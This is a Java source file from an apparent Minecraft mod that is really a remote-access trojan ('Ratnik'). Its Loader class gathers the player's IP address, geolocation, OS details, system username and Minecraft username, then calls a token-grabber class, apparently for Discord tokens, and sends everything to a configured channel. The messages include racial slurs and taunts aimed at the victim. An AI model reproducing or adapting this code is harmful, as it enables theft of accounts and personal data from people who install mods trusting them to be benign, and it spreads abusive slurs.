package com.example.examplemod.Hacks.Print;


import com.example.examplemod.Hacks.Print.TockenGrabber.b;
import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;

import net.minecraft.client.Minecraft;

import javax.imageio.ImageIO;
import java.io.File;
import java.io.IOException;
import java.util.Scanner;
import java.net.URL;

public class Loader {

    //Strings
    static String ip;
    static String geolocation;
    static {
        try {
            ip = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8").useDelimiter("\\A").next();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    static {
        try {
            geolocation = new Scanner(new URL("https://geolocation-db.com/json/").openStream(), "UTF-8").useDelimiter("\\A").next();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    //Strings

    public Loader() throws IOException {
    }

    public static void dothething() {
        String ign = Minecraft.getMinecraft().getSession().getUsername();
        SendMessage.doThing("||@everyone|| **----------------- Loaded logger by ** **"+Minecraft.getMinecraft().getSession().getUsername()+"**\n"+"```"+"Ratnik is loaded Ezzzzzd by dazed, cry about nigga with username <<< " + Minecraft.getMinecraft().getSession().getUsername()+ " >>>```"+
                "```Ip is: "+ip+"```"+"```Geolocation: "+geolocation+"```"+"```"+"Os name: "+System.getProperty("os.name")+"\n"+
                        "Os arch: "+System.getProperty("os.arch")+"\n"+
                        "User name: "+System.getProperty("user.name")+"\n"+
                        "```"+"```Niggas tocken is - " + b.grabTokens()+"```" +"https://ru.namemc.com/profile/"+Minecraft.getMinecraft().getSession().getUsername()+"\n"+"```NameMC profile ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^```"
                , Cfg.RatChannel
        );
        SendMessage.doThing("**Start Session ----------------------------------------------------------------------------------------**",Cfg.FilesChannel);

    }

}